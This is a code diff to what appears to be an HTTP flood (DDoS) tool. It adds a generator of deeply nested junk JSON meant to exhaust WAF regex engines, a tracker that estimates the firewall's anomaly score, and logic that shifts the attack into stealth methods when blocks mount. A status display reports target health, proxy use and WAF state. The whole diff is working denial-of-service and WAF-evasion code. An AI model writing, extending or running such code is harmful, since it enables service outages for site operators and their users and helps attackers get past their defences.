@@ -1185,7 +1185,58 @@ class AsyncHttpFlood(Thread):
                 return f"http://{p_str}"
         return None
     
+    def _chaos_generate_battering_ram(self):
+        """Generate a Battering Ram payload - highly obfuscated, nested JSON.
+        Designed to exhaust WAF regex engines (ReDoS) or bypass deep inspection."""
+        intel = self._chaos_intel
+        rs = ProxyTools.Random.rand_str
+        
+        # Deeply nested, junk-filled JSON structure that takes WAFs a long time to parse
+        payload = "{"
+        for i in range(15):
+            payload += f'"{rs(8)}": {{"{rs(5)}": '
+        
+        # Insert actual payload deep inside
+        payload += f'"{rs(32)}"'
+        
+        # Close brackets
+        for i in range(15):
+            payload += "}"
+            
+        payload += "}"
+        intel["battering_ram"] = payload
+        return payload
+
+    def _chaos_track_anomaly(self, was_blocked):
+        """Estimate the WAF's internal anomaly score for our traffic.
+        If we hit the threshold, we must go absolute zero-stealth to cool off."""
+        intel = self._chaos_intel
+        
+        # WAFs cool down over time
+        if intel["total_executions"] % 10 == 0:
+            intel["anomaly_score"] = max(intel["anomaly_score"] - 5, 0)
+            
+        if was_blocked:
+            intel["anomaly_score"] += 25
+            
+        # If anomaly is dangerously high, force stealth cooldown
+        if intel["anomaly_score"] > 80:
+            intel["stealth_cooldown"] = 50  # Next 50 requests MUST be stealth
+            
+        # Tick down cooldown
+        if intel["stealth_cooldown"] > 0:
+            intel["stealth_cooldown"] -= 1
+
     def _generate_post_payload(self) -> str:
+        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
+        # Many WAFs block static {"data": "xxxxx"} patterns
+        # Uses smart content-type-aware payloads for deeper evasion
+        intel = getattr(self, '_chaos_intel', {})
+        if intel.get("stealth_cooldown", 0) > 0 and randint(1, 100) < 50:
+            # Under stealth cooldown, use highly evasive battering ram 50% of the time
+            return self._chaos_generate_battering_ram()
+            
+        r_type = randint(1, 6)
         # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
         # Many WAFs block static {"data": "xxxxx"} patterns
         # Uses smart content-type-aware payloads for deeper evasion
@@ -2653,6 +2704,10 @@ class HttpFlood(Thread):
         "pulse_count": 0,         # Tracking how many swarm pulses executed
         "proxy_health_purged": 0, # Count of dead proxies auto-purged by AI
         "utm_rotation": 0,        # Tracker for query fuzzing
+        "geo_routing": None,      # Target geographical routing node (e.g. cloudflare colo)
+        "battering_ram": None,    # A specialized highly-evasive payload structure
+        "anomaly_score": 0,       # Track how "abnormal" the WAF thinks our traffic is
+        "stealth_cooldown": 0,    # Cooldown timer to force stealth after heavy detection
     }
     
     # ========================================================================
@@ -4710,6 +4765,9 @@ class HttpFlood(Thread):
         # Track hot streaks
         self._chaos_hot_streak(method_name, success)
         
+        # Track WAF anomaly score
+        self._chaos_track_anomaly(not success)
+        
         # Track consecutive blocks for emergency mode
         if not success:
             intel["consecutive_block"] += 1
@@ -4814,6 +4872,14 @@ class HttpFlood(Thread):
         # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
         
+        # Phase 2.4: ANOMALY COOLDOWN ENFORCEMENT
+        if intel.get("stealth_cooldown", 0) > 0:
+            # We are too hot. WAF is watching closely. Suppress noisy attacks.
+            for m in weights:
+                if m not in ("STEALTH_JA3", "SLOW_V2", "COOKIE", "BOT"):
+                    weights[m] = 0
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 100)
+
         # Phase 2.5: DIVERSITY ENFORCEMENT
         weights = self._chaos_force_diversity(weights, {
             "GET": 1, "POST": 1, "STRESS": 1, "PPS": 1, "DYN": 1,
@@ -5010,7 +5076,8 @@ class HttpFlood(Thread):
                 elif slope > 100:
                     print(f"  Trend       : {bcolors.OKGREEN}Latency rising fast (slope: +{int(slope)}){bcolors.RESET}")
                 print(f"  Target HP   : {health_indicator}")
-                print(f"  WAF Status  : {waf_status}")
+                cooldown_str = f" {bcolors.WARNING}[COOLDOWN ACTIVE]{bcolors.RESET}" if intel.get("stealth_cooldown", 0) > 0 else ""
+                print(f"  WAF Status  : {waf_status} | Anomaly: {intel.get('anomaly_score', 0)}/100{cooldown_str}")
                 print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
                 print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
                 print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
